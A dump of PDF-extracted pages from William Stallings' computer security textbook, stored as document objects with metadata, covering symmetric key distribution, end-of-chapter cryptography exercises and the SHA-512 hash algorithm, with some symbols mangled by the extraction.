algorithm differs substantially from the \\nencryption algorithm, as it does for AES. In addition, the decryption key sched-\\nuling need not be implemented.\\n 20.6 KEY DISTRIBUTION\\nFor symmetric encryption to work, the two parties to an exchange must share the \\nsame key, and that key must be protected from access by others. Furthermore, fre -\\nquent key changes are usually desirable to limit the amount of data compromised if \\nan attacker learns the key. Therefore, the strength of any cryptographic system rests \\nwith the key distribution technique, a term that refers to the means of delivering a \\nkey to two parties that wish to exchange data, without allowing others to see the key. \\nKey distribution can be achieved in a number of ways. For two parties A and B:\\n1. A key could be selected by A and physically delivered to B.\\n2. A third party could select the key and physically deliver it to A and B.\\n3. If A and B have previously and recently used a key, one party could transmit the \\nnew key to the other, encrypted using the old key.\\n4. If A and B each have an encrypted connection to a third party C, C could \\ndeliver a key on the encrypted links to A and B.\\nOptions 1 and 2 call for manual delivery of a key. For link encryption between two \\ndirectly-connected devices, this is a reasonable requirement, because each link encryp-\\ntion device is only going to be exchanging data with its partner on the other end of the \\nlink. However, for end-to-end encryption over a network, manual delivery is awkward. \\nIn a distributed system, any given host or terminal may need to engage in exchanges with \\nmany other hosts and terminals over time. Thus, each device needs a number of keys, sup-\\nplied dynamically. The problem is especially difficult in a wide area distributed system.\\nOption 3 is a possibility for either link encryption or end-to-end encryption, but \\nif an attacker ever succeeds in gaining access to one key, then all subsequent keys are \\nrevealed. Even if frequent changes are made to the link encryption keys, these should \\nbe done manually. To provide keys for end-to-end encryption, option 4 is preferable.\\nFigure 20.10 illustrates an implementation that satisfies option 4 for end-to-\\nend encryption. In the figure, link encryption is ignored. This can be added, or not, as \\nrequired. For this scheme, two kinds of keys are identified:\\n• Session key: When two end systems (hosts, terminals, etc.) wish to  communicate, \\nthey establish a logical connection (e.g., virtual circuit). For the duration of \\nthat logical connection, all user data are encrypted with a one-time session key. \\nAt\\xa0the conclusion of the session, or connection, the session key is destroyed.\\n• Permanent key: A permanent key is a key used between entities for the purpose \\nof distributing session keys.\\nM20_STAL0611_04_GE_C20.indd   650 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 652, 'page_label': '651'}, page_content='20.6 / KEy diSTRiBUTion  651\\n The configuration consists of the following elements:\\n• Key distribution center: The key distribution center (KDC) determines which \\nsystems are allowed to communicate with each other. When permission is \\ngranted for two systems to establish a connection, the KDC provides a one-\\ntime session key for that connection.\\n• Security service module (SSM): This module, which may consist of  functionality \\nat one protocol layer, performs end-to-end encryption and obtains session keys \\non behalf of users.\\nThe steps involved in establishing a connection are shown in Figure 20.10. When \\none host wishes to set up a connection to another host, it transmits a connection-\\nrequest packet (step 1). The SSM saves that packet and applies to the KDC for \\npermission to establish the connection (step 2). The communication between the \\nSSM and the KDC is encrypted using a master key shared only by this SSM and the \\nKDC. If the KDC approves the connection request, it generates the session key and \\ndelivers it to the two appropriate SSMs, using a unique permanent key for each SSM \\n(step 3). The requesting SSM can now release the connection request packet, and a \\nconnection is set up between the two end systems (step 4). All user data exchanged \\nbetween the two end systems are encrypted by their respective SSMs using the one-\\ntime session key.\\nThe automated key distribution approach provides the flexibility and dynamic \\ncharacteristics needed to allow a number of terminal users to access a number of \\nhosts and for the hosts to exchange data with each other.\\nAnother approach to key distribution uses public-key encryption, which will \\nbe  discussed in Chapter 21.\\nFigure 20.10 Automatic Key Distribution for Connection-Oriented Protocol\\nKey\\ndistribution\\ncenter\\nNetwork\\n1. Host sends packet requesting connection.\\n2. Security service buﬀers packet; asks\\n    KDC for session key.\\n3. KDC distributes session key to both hosts.\\n4. Buﬀered packet transmitted.\\nHOST\\nApplication \\nSecurity\\nservice\\nHOST\\nApplication\\nSecurity\\nservice\\n2\\n3\\n4\\n1\\nM20_STAL0611_04_GE_C20.indd   651 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 653, 'page_label': '652'}, page_content='652  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\n 20.7 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\nReview Questions\\n 20.1 List the dimensions across which cryptographic systems are classified.\\n 20.2 What are different types of cryptanalysis attacks?\\n 20.3 When is an encryption scheme considered to be computationally secure?\\n 20.4 What is the difference between a block cipher and a stream cipher?\\n 20.5 List the different block cipher modes of operation.\\n 20.6 Why do some block cipher modes of oper ation only use encryption while others use \\nboth encryption and decryption?\\n 20.7 What is triple encryption?\\n 20.8 Why is the middle portion of 3DES a decryption rather than an encryption?\\n 20.9 State the advantages of CTR mode.\\n 20.10 List ways in which secret keys can be distributed to two communicating parties.\\n 20.11 What is the difference between a session key and a master key?\\n 20.12 What is a security service module?\\nProblems\\n 20.1 Let the encryption of a message M with a secret key K using DES be denoted by \\nY = DESK(M), and the bit-complement of Z be denoted by c(Z). Prove that the key-\\ncomplementation property of DES: c(Y) = DESc(K)(c(M)).\\n 20.2 Consider a Feistel cipher composed of 1 6 rounds with block length 128 bits and key \\nlength 128 bits. Suppose for a given k, the key scheduling algorithm determines values \\nfor the first 8 round keys, k1, k2, c k8, then sets\\nk9 = k8, k10 = k7, k11 = k6, c, k16 = k1\\nSuppose you have a ciphertext c. Explain how, with access to an encryption oracle, \\nyou can decrypt c and determine m using just a single oracle query. This shows that \\nsuch a cipher is vulnerable to a chosen plaintext attack. (An encryption oracle can be \\nthought of as a device that, when given a plaintext, returns the corresponding cipher-\\ntext. The internal details of the device are not known to you and you cannot break \\nopen the device. You can only gain information from the oracle by making queries to \\nit and observing its responses.)\\nAdvanced Encryption \\n Standard (AES)\\nblock cipher\\nbrute-force attack\\ncomputationally secure\\ncipher block chaining  \\n(CBC) mode\\ncipher feedback (CFB) mode\\nciphertext\\ncounter mode\\ncryptanalysis\\ncryptography Data  \\nEncryption Standard (DES)\\ndecryption\\nelectronic codebook  \\n(ECB) mode\\nencryption\\nend-to-end encryption\\nFeistel cipher\\nkey distribution\\nkeystream\\nlink encryption\\nmodes of operation\\nplaintext\\nRC4\\nsession key\\nstream cipher\\nsubkey\\nsymmetric encryption\\ntriple DES (3DES)\\nM20_STAL0611_04_GE_C20.indd   652 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 654, 'page_label': '653'}, page_content='20.7 / KEy TERMS, REViEW QUESTionS, And PRoBlEMS  653\\n 20.3 For any block cipher, the fact that it is a nonlinear function is crucial to its security. \\nTo see this, suppose we have a linear block cipher EL that encrypts 128-bit blocks of \\nplaintext into 128-bit blocks of ciphertext. Let EL( k, m) denote the encryption of a \\n128-bit message m under a key k (the actual bit length of k is irrelevant). Thus\\nEL(k, [m1 /uni2295.altm2]) = EL (k, m1) /uni2295.altEL (k, m1) for all 128@bit patterns m1, m2\\nDescribe how, with 128 chosen ciphertexts, an adversary can decrypt any ciphertext \\nwithout knowledge of the secret key k. (A “chosen ciphertext” means that an adver-\\nsary has the ability to choose a ciphertext and then obtain its decryption. Here, you \\nhave 128 plaintext/ciphertext pairs with which to work and you have the ability to \\nchose the value of the ciphertexts.)\\n 20.4 Suppose that your organization wants you to ensure the security of its data while the \\ndata is in transit. Which one out of stream cipher and block cipher would you select \\nand why?\\n 20.5 RC4 has a secret internal state which is a permutation of all the possible values of the \\nvector S and the two indices i and j.\\na. Using a straightforward scheme to store the internal state, how many bits are used?\\nb. Suppose we think of it from the point of view of how much information is represented \\nby the state. In that case, we need to determine how may different states there are, \\nthen take the log to the base 2 to find out how many bits of information this repre-\\nsents. Using this approach, how many bits would be needed to represent the state?\\n 20.6 With the ECB mode, if there is an error in a block of the transmitted ciphertext, only \\nthe corresponding plaintext block is affected. However, in the CBC mode, this error \\npropagates. For example, an error in the transmitted Ck (Figure 20.6) obviously cor-\\nrupts Pk and Pk + 1:\\na. Are any blocks beyond Pk + 1 affected?\\nb. Suppose that there is a bit err or in the source version of Pk. Through how many \\nciphertext blocks is this error propagated? What is the effect at the receiver?\\n 20.7 Can we perform encryption operations in par allel on multiple blocks of plaintext in \\nany of the five modes? How about decryption?\\n 20.8 You want to build a har dware device to do block encryption in the cipher block \\n chaining (CBC) mode using an algorithm stronger than DES . 3DES is a good candi-\\ndate. Figure 20.11 shows two possibilities, both of which follow from the definition of \\nCBC. Which of the two would you choose:\\na. For security?\\nb. For performance?\\n 20.9 Can you suggest a security improvement to either option in Figure 20.11, using only three \\nDES chips and some number of XOR functions? Assume you are still limited to two keys.\\n 20.10 Fill in the remainder of this table:\\nMode Encrypt Decrypt\\nECB  Cj = E(K, Pj) j = 1, c, N Pj = D(K, Cj) j = 1, c, N\\nCBC  C1 = E(K, [P1 /uni2295.altIV])\\n Cj = E(K, [Pj /uni2295.altCj- 1]) j = 2, c, N\\n P1 = D(K, C1) /uni2295.altIV\\n Pj = D(K, Cj) /uni2295.altCj - 1 j = 2, c, N\\nCFB\\nCTR\\n 20.11 CBC-Pad is a block cipher mode of operation used in the RC5 block cipher, but it could \\nbe used in any block cipher. CBC-Pad handles plaintext of any length. The\\xa0ciphertext \\nis longer then the plaintext by at most the size of a single block. Padding is used to \\nassure that the plaintext input is a multiple of the block length. It is assumed that the \\nM20_STAL0611_04_GE_C20.indd   653 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 655, 'page_label': '654'}, page_content='654  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\noriginal plaintext is an integer number of bytes. This plaintext is padded at the end by \\nfrom 1 to bb bytes, where bb equals the block size in bytes. The pad bytes are all the \\nsame and set to a byte that represents the number of bytes of padding. For example, \\nif there are 8 bytes of padding, each byte has the bit pattern 00001000. Why not allow \\nzero bytes of padding? That is, if the original plaintext is an integer multiple of the \\nblock size, why not refrain from padding?\\n 20.12 Padding may not always be appropriate. For example, one might wish to store the \\nencrypted data in the same memory buffer that originally contained the plaintext. In \\nthat case, the ciphertext must be the same length as the original plaintext. A mode for \\nthat purpose is the ciphertext stealing (CTS) mode. Figure 20.12a shows an implemen-\\ntation of this mode.\\na. Explain how it works.\\nb. Describe how to decrypt Cn - 1 and Cn.\\n 20.13 Figure 20.12b shows an alternative to CTS for producing ciphertext of equal length to \\nthe plaintext when the plaintext is not an integer multiple of the block size.\\na. Explain the algorithm.\\nb. Explain why CTS is preferable to this approach illustrated in Figure 20.12b.\\n 20.14 If a bit error occurs in the tr ansmission of a ciphertext character in b-bit CFB mode, \\nhow far does the error propagate?\\nFigure 20.11 Use of Triple DES in CBC Mode\\nEDE\\nCn - 1\\nCn\\nK1, K2\\nPn\\n(a) One-loop CBC\\n(b) Three-loop CBC\\n + \\nE\\nAn - 1\\nAn\\nK1\\nPn\\n + \\nD\\nBn - 1\\nBn\\nK2\\n + \\nE\\nCn - 1\\nCn\\nK1\\n + \\nM20_STAL0611_04_GE_C20.indd   654 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 656, 'page_label': '655'}, page_content='20.7 / KEy TERMS, REViEW QUESTionS, And PRoBlEMS  655\\n 20.15 One of the most widely used message authentication codes (MACs), referred to as the \\nData Authentication Algorithm, is based on DES. The algorithm is both a FIPS publi-\\ncation (FIPS PUB 113) and an ANSI standard (X9.17). The algorithm can be defined \\nas using the cipher block chaining (CBC) mode of operation of DES with an initializa-\\ntion vector of zero (see Figure 20.7). The data (e.g., message, record, file, or program) \\nto be authenticated are grouped into contiguous 64-bit blocks: P1, P2, c, PN. If neces-\\nsary, the final block is padded on the right with 0s to form a full 64-bit block. The MAC \\nconsists of either the entire ciphertext block CN or the leftmost M bits of the block, \\nwith 16 … M … 64. Show the same result can be produced using the cipher feedback \\nmode.\\n 20.16 As discussed in Section Section\\xa0 20.7, two parties can exchange the new keys by \\nencrypting them with recently used old keys. Discuss the security implications of such \\nan approach.\\n 20.17 Suppose someone suggests the following way to confirm that the two of you are both \\nin possession of the same secret key. You create a random bit string the length of the \\nkey, XOR it with the key, and send the result over the channel. Your partner XORs the \\nincoming block with the key (which should be the same as your key) and sends it back. \\nYou check, and if what you receive is your original random string, you have  verified \\nthat your partner has the same secret key, yet neither of you has ever transmitted the \\nkey. Is there a flaw in this scheme?\\nFigure 20.12 Block Cipher Modes for Plaintext Not a Multiple of Block Size\\nIV P1\\nC1\\nK K K K\\n +  +  +  + \\nPN-2\\nCN-2\\nC N-3\\nEncrypt Encrypt Encrypt Encrypt\\nEncrypt Encrypt\\n(a) Cipheretext stealing mode\\n(b) Alternative method\\nEncrypt\\nCN X\\nPN-1\\nCN-1\\nPN 00…0\\nIV\\nP1\\n( bb bits)\\nC1\\n( bb bits)\\nK K K K\\n +  +  +  + \\nPN-2\\n( bb bits)\\nCN-2\\n( bb bits)\\nCN-3\\nSelect\\nleftmost\\nj bits\\nPN-1\\n( bb bits)\\nCN-1\\n( bb bits)\\nPN\\n( j bits)\\nCN\\n( j bits)\\nEncrypt\\nM20_STAL0611_04_GE_C20.indd   655 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 657, 'page_label': '656'}, page_content='656\\n21.1 Secure Hash Functions\\nSimple Hash Functions\\nThe SHA Secure Hash Function\\nSHA-3\\n21.2 HMAC\\nHMAC Design Objectives\\nHMAC Algorithm\\nSecurity of HMAC\\n21.3 Authenticated Encryption\\n21.4 The RSA Public-Key Encryption Algorithm\\nDescription of the Algorithm\\nThe Security of RSA\\n21.5 Diffie-Hellman and Other Asymmetric Algorithms\\nDiffie-Hellman Key Exchange\\nOther Public-Key Cryptography Algorithms\\n21.6 Key Terms, Review Questions, and Problems\\nPublic-Key Cryptography  \\nand Message Authentication\\nCHAPTER \\n \\nM21_STAL0611_04_GE_C21.indd   656 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 658, 'page_label': '657'}, page_content='21.1 / SECURE HASH FUNCTIONS  657\\nThis chapter provides technical detail on the topics introduced in Sections 2.2 \\nthrough\\xa02.4.\\n 21.1 SECURE HASH FUNCTIONS\\nThe one-way hash function, or secure hash function, is important not only in  message \\nauthentication but also in digital signatures. The requirements for, and security of, \\nsecure hash functions are discussed in Section 2.2. Here, we look at several hash \\nfunctions, concentrating on perhaps the most widely used family of hash functions: \\nSecure Hash Algorithm (SHA).\\nSimple Hash Functions\\nAll hash functions operate using the following general principles. The input (message, \\nfile, etc.) is viewed as a sequence of n-bit blocks. The input is processed one block at \\na time in an iterative fashion to produce an n-bit hash function.\\nOne of the simplest hash functions is the bit-by-bit exclusive-OR (XOR) of \\nevery block. This can be expressed as follows:\\nCi = bi1 /uni2295.altbi2 /uni2295.altc /uni2295.altbim\\nwhere\\n Ci = ith bit of the hash code, 1 … i … n,\\n m = number of n-bit blocks in the input,\\n bij = ith bit in jth block, and\\n /uni2295.alt= XOR operation.\\nFigure 21.1 illustrates this operation; it produces a simple parity for each bit \\nposition and is known as a longitudinal redundancy check. It is reasonably effective \\nfor random data as a data integrity check. Each n-bit hash value is equally likely. \\nThus, the probability that a data error will result in an unchanged hash value is 2-n. \\nWith more predictably formatted data, the function is less effective. For example, in \\nmost normal text files, the high-order bit of each octet is always zero. So if a 128-bit \\nhash value is used, instead of an effectiveness of 2-128, the hash function on this type \\nof data has an effectiveness of 2-112.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Understand the operation of SHA-1 and SHA-2.\\n ◆ Present an overview of the use of HMAC for message authentication.\\n ◆ Describe the RSA algorithm.\\n ◆ Describe the Diffie-Hellman algorithm.\\nM21_STAL0611_04_GE_C21.indd   657 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 659, 'page_label': '658'}, page_content='658  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nA simple way to improve matters is to perform a 1 -bit circular shift, or rotation, on \\nthe hash value after each block is processed. The procedure can be summarized as follows:\\n1. Initially set the n-bit hash value to zero.\\n2. Process each successive n-bit block of data as follows:\\na. Rotate the current hash value to the left by 1 bit.\\nb. XOR the block into the hash value.\\nThis has the effect of “randomizing” the input more completely and overcoming any \\nregularities that appear in the input.\\nAlthough the second procedure provides a good measure of data integrity, it is virtu-\\nally useless for data security when an encrypted hash code is used with a plaintext message, \\nas in Figures 2.5a and b. Given a message, it is an easy matter to produce a new message \\nthat yields that hash code: Simply prepare the desired alternate message, then append  \\nan n-bit block that forces the new message plus block to yield the desired hash code.\\nAlthough a simple XOR or rotated XOR (RXOR) is insufficient if only the hash \\ncode is encrypted, you may still feel that such a simple function could be useful when \\nthe message as well as the hash code is encrypted. But one must be careful. A technique \\noriginally proposed by the National Bureau of Standards used the simple XOR applied \\nto 64-bit blocks of the message and then an encryption of the entire message that used \\nthe cipher block chaining (CBC) mode. We can define the scheme as follows: Given a \\nmessage consisting of a sequence of 64-bit blocks X1, X2, c, XN, define the hash code \\nC as the block-by-block XOR or all blocks and append the hash code as the final block:\\nC = XN + 1 = X1 /uni2295.altX2 /uni2295.altc /uni2295.altXN\\nNext, encrypt the entire message plus hash code, using CBC mode to produce the \\nencrypted message Y1, Y2, c, XN + 1. [JUEN85] points out several ways in which the \\nciphertext of this message can be manipulated in such a way that it is not detectable \\nby the hash code. For example, by the definition of CBC (see Figure 20.7), we have:\\n X1 = IV /uni2295.altD(K, Y1)\\n Xi = Yi- 1 /uni2295.altD(K, Yi)\\n XN + 1 = YN /uni2295.altD(K, YN + 1)\\nBut XN + 1 is the hash code:\\n XN + 1 = X1 /uni2295.altX2 /uni2295.altc /uni2295.altXN\\n = [IV /uni2295.altD(K, Y1)] /uni2295.alt[Y1 /uni2295.altD(K, Y2)] /uni2295.altc/uni2295.alt[YN - 1 /uni2295.altD(K, YN)]\\nFigure 21.1 Simple Hash Function Using Bitwise XOR\\nBit 1\\nBlock 1\\nBlock 2\\nBlock m\\nHash code\\nb11 b21 bn1\\nbn2\\nbnm\\nb22\\nb2m\\nb12\\nb1m\\nC1 C2 Cn\\nBit 2 Bit n\\nM21_STAL0611_04_GE_C21.indd   658 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 660, 'page_label': '659'}, page_content='21.1 / SECURE HASH FUNCTIONS  659\\nBecause the terms in the preceding equation can be XORed in any order, it follows \\nthat the hash code would not change if the ciphertext blocks were permuted.\\nThe SHA Secure Hash Function\\nIn recent years, the most widely used hash function has been the Secure Hash Algo-\\nrithm (SHA). Indeed, because virtually every other widely used hash function had \\nbeen found to have substantial cryptanalytic weaknesses, SHA was more or less the \\nlast remaining standardized hash algorithm by 2005. SHA was developed by the \\nNational Institute of Standards and Technology (NIST) and published as FIPS 180 in \\n1993. When weaknesses were discovered in SHA (now known as SHA-0), a revised \\nversion was issued as FIPS 180-1 in 1995 and is referred to as SHA-1. The actual \\nstandards document is entitled “Secure Hash Standard. SHA-1 is also specified in \\nRFC 3174 (US Secure Hash Algorithm 1 (SHA1), 2001), which essentially duplicates \\nthe material in FIPS 180-1 but adds a C code implementation.\\nSHA-1 produces a hash value of 160 bits. In 2002, NIST produced a revised ver-\\nsion of the standard, FIPS 180-2, that defined three new versions of SHA, with hash \\nvalue lengths of 256, 384, and 512 bits, known as SHA-256, SHA-384, and SHA-512, \\nrespectively (see Table 21.1). Collectively,  these hash algorithms are known as SHA-2. \\nThese new versions have the same underlying structure and use the same types of \\nmodular arithmetic and logical binary operations as SHA-1. A revised document was \\nissued as FIPS 180-3 in 2008, which added a 224-bit version of SHA-256, whose hash \\nvalue is obtained by truncating the 256-bit hash value of SHA-256. SHA-1 and SHA-2 \\nare also specified in RFC 6234 ( US Secure Hash Algorithms (SHA and SHA-based \\nHMAC and HKDF), 2011), which essentially duplicates the material in FIPS 180-3 but \\nadds a C code implementation. The most recent version is FIPS 180-4 [Secure Hash \\nStandard (SHS), August 2015] which added two variants of SHA-512 with 224-bit and \\n256-bit hash sizes, as SHA-512 is more efficient than SHA-256 on many 64-bit systems.\\nIn 2005, NIST announced the intention to phase out approval of SHA-1 and move \\nto a reliance on SHA-2 by 2010. Shortly thereafter, a research team described an attack \\nin which two separate messages could be found that deliver the same SHA-1 hash using \\n269 operations, far fewer than the 280 operations previously thought needed to find a col-\\nlision with an SHA-1 hash [WANG05]. This result has hastened the transition to SHA-2.\\nIn this section, we provide a description of SHA-512. The other versions are \\nquite similar. The algorithm takes as input a message with a maximum length of less \\nSHA-1 SHA-224 SHA-256 SHA-384 SHA-512 SHA-512/224 SHA-512/256\\nMessage size 6 264 6 264 6 264 6 2128 6 2128 6 2128 6 2128\\nWord size 32 32 32 64 64 64 64\\nBlock size 512 512 512 1024 1024 1024 1024\\nMessage digest size 160 224 256 384 512 224 256\\nNumber of steps 80 64 64 80 80 80 80\\nSecurity 80 112 128 192 256 112 128\\nNotes: 1. All sizes are measured in bits.\\n 2.  Security refers to the fact that a birthday attack on a message digest of size n produces a collision with a \\nwork factor of approximately 2n/2.\\nTable 21.1 Comparison of SHA Parameters\\nM21_STAL0611_04_GE_C21.indd   659 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 661, 'page_label': '660'}, page_content='660  CHAPTER 21 / PUblIC-KEy CRyPTOgRAPHy ANd MESSAgE AUTHENTICATION \\nthan 2128 bits and produces as output a 512-bit message digest. The input is processed \\nin 1024-bit blocks. Figure 21.2 depicts the overall processing of a message to produce \\na digest. The processing consists of the following steps:\\n• Step 1: Append padding bits. The message is padded so its length is congruent \\nto 896 modulo 1024 [length K 896 (mod 1024)]. Padding is always added, even \\nif the message is already of the desired length. Thus, the number of  padding \\nbits is in the range of 1 to 1024. The padding consists of a single 1 -bit  followed \\nby the necessary number of 0-bits.\\n• Step 2: Append length. A block of 128 bits is appended to the message. This \\nblock is treated as an unsigned 128-bit integer (most significant byte first) and \\ncontains the length of the original message (before the padding).\\nThe outcome of the first two steps yields a message that is an integer \\n multiple of 1024 bits in length. In F igure 21.2, the expanded message is repre-\\nsented as the sequence of 1024-bit blocks M1, M2, c, MN, so the total length \\nof the expanded message is N * 1024 bits.\\n• Step 3: Initialize hash buffer. A 512-bit buffer is used to hold intermediate and \\nfinal results of the hash function. The buffer can be represented as eight 64-bit \\nregisters (a, b, c, d, e, f, g, h). These registers are initialized to the following  \\n64-bit integers (hexadecimal values):\\n a = 6A09E667F3BCC908   e = 510E527FADE682D1\\n b = BB67AE8584CAA73B  f = 9B05688C2B3E6C1F\\n c = 3C6EF372FE94F82B   g = 1F83D9ABFB41BD6B\\n d = A54FF53A5F1D36F1   h = 5BE0CD19137E2179\\nFigure 21.2 Message Digest Generation Using SHA-512\\nN * 1024 bits\\nM1 M2\\nH2H1\\nMN\\nFIV =\\nH0\\nF\\nMessage\\n1024\\nHN =\\nhash\\ncode\\n1024\\nF\\n1024\\n1024 bits 1024 bits 1024 bits\\nL bits\\nL\\n128 bits\\n512\\n100..0\\n+ + +\\n+ = word-by-word addition mod 264\\nM21_STAL0611_04_GE_C21.indd   660 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 662, 'page_label': '661'}, page_content='21.1 / SECURE HASH FUNCTIONS  661\\nThese values are stored in big-endian format, which is the most significant \\nbyte of a word in the low-address (leftmost) byte position. These words were \\nobtained by taking the first 64 bits of the fractional parts of the square roots of \\nthe first eight prime numbers.\\n• Step 4: Process message in 1024-bit (128-word) blocks.  The heart of the \\n algorithm is a module that consists of 80 rounds;  this module is labeled F in \\nFigure \\xa021.2. The logic is illustrated in Figure 21.3.\\nEach round takes as input the 512-bit buffer value abcdefgh and updates \\nthe contents of the buffer. At input to the first round, the buffer has the value \\nof the intermediate hash value, Hi - 1. Each round t makes use of a 64-bit \\nvalue Wt, derived from the current 1024-bit block being processed (Mi). Each \\nround also makes use of an additive constant Kt, where 0 … t … 79 indicates \\none of the 80 rounds. These words represent the first 64 bits of the fractional \\nparts of the cube roots of the first 80 prime numbers. The constants provide \\na “randomized” set of 64-bit patterns, which should eliminate any regulari -\\nties in the input data. The operations performed during a round consist of \\ncircular shifts, and primitive Boolean functions based on AND, OR, NOT,  \\nand XOR.\\nFigure 21.3 SHA-512 Processing of a Single 1024-Bit Block\\n64\\nM i\\nW t\\nH i\\nH i-1\\nW 0\\nW 79\\nK t\\nK 0\\nK 79\\na b c\\nRound 0\\nd e f g h\\na b c\\nRound t\\nd e f g h\\nMessage\\nschedule\\na b c\\nRound 79\\nd e f g h\\n+ + + + + + + +\\nM21_STAL0611_04_GE_C21.indd   661 10/11/17   3:19 PM'),\n",
